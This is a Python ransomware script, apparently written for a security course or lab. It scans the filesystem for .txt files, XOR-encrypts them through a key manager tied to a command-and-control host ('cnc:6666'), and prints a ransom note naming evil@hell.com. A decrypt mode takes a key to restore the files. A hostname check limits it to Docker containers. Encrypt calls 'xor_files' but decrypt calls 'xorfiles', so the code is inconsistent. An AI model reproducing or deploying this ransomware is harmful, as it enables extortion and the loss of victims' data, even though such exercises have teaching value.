import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""

DECRYPT_MESSAGE = """
 _____ _ _             ____                             _           _ 
|  ___(_) | ___  ___  |  _ \  ___  ___ _ __ _   _ _ __ | |_ ___  __| |
| |_  | | |/ _ \/ __| | | | |/ _ \/ __| '__| | | | '_ \| __/ _ \/ _` |
|  _| | | |  __/\__ \ | |_| |  __/ (__| |  | |_| | |_) | ||  __/ (_| |
|_|   |_|_|\___||___/ |____/ \___|\___|_|   \__, | .__/ \__\___|\__,_|
                                            |___/|_| 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        path = Path("/") 
        list_file = [file for file in path.rglob(filter)]
        list_file_str = [str(txt) for txt in list_file]
        return list_file_str

    def encrypt(self):
        # Main function for encrypting (see PDF)
        # Find all txt files
        txt_files = self.get_files("*.txt")

        #Create the Key Manager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        secret_manager.setup()

        # Encrypt the files
        secret_manager.xor_files(txt_files)

        token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token.hex()))

    def decrypt(self):
        # Create an instance of SecretManager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)

        # Load the local cryptographic elements
        secret_manager.load()

        # List all the .txt files
        txt_files = self.get_files("*.txt")

        while True:
            try:
                # Ask for the decryption key
                _key = input("Enter the key to decrypt your files: ")

                # Set the key
                secret_manager.set_key(_key)

                # Decrypt the files using the xorfiles() method of SecretManager
                secret_manager.xorfiles(txt_files)

                # Clean up the local cryptographic files
                secret_manager.clean()

                # Inform the user that the decryption was successful
                print(DECRYPT_MESSAGE)

                # Exit the ransomware
                break
            except ValueError as error:
                # Inform the user that the key is invalid
                print(f"Error: {error}. Invalid key. Please try again.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()
